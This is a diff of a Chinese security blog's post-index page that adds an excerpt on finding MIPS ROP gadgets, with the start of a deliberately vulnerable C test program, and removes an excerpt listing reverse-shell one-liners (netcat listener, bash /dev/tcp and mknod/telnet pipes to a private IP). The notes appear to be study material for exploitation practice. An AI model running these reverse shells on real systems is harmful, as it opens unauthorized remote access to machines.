@@ -170,6 +170,23 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>关于mips下的rop学习 关于mips中rop链的查找 与x86下寻找rop不同，ROPgadget对于寻找mips的rop不太方便，所以这里我们就需要安装ida下的mipsfinder插件，具体的方法。
+这里我们需要说明一些需要注意的地方：
+我们不仅需要点击MIPS ROP Finder
+还需要点击mips rop gadgets
+不然会报错，找不到stackfinder()函数
+计算偏移 //rop-test.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;void do_system(int code,char *cmd){char buf[255];//sleep(1);system(cmd);}int main(){char buf[256]={0};char ch;int count = 0;unsigned int fileLen = 0;struct stat fileData;FILE *fp;if(0 == stat(&#34;passwd&#34;,&amp;fileData))fileLen = fileData.st_size;elsereturn 1;if((fp = fopen(&#34;passwd&#34;,&#34;rb&#34;)) == NULL){printf(&#34;Cannot open file passwd!...</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to " href="https://jellyfish-pro.github.io/note/mips%E4%B8%8B%E7%9A%84rop%E5%AD%A6%E4%B9%A0/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>arm交叉编译
     </h2>
   </header>
@@ -312,23 +329,6 @@ bindadress bindport connectaddress connectport监听的ip 监听ip的端口 转
   </div>
   <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
   <a class="entry-link" aria-label="post link to rinetd端口转发" href="https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>shell
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>一般选择反弹shell 攻击机：
-nc -lnvp 8080 目标机：
-bash -i &gt;&amp; /dev/tcp/192.168.113.128/8080 0&gt;&amp;1或bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.113.128/8080 0&gt;&amp;1&#34; 或者
-mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &lt; /ram/f | /bin/bash &gt;/ram/f 2&gt;&amp;1 mknod：创建名为 /ram/f的管道
-若在脚本中使用：
-rm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 &lt; /tmp/f |/bin/bash &gt;/tmp/f 2&gt;/tmp/f </p>
-  </div>
-  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to shell" href="https://jellyfish-pro.github.io/note/shell/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
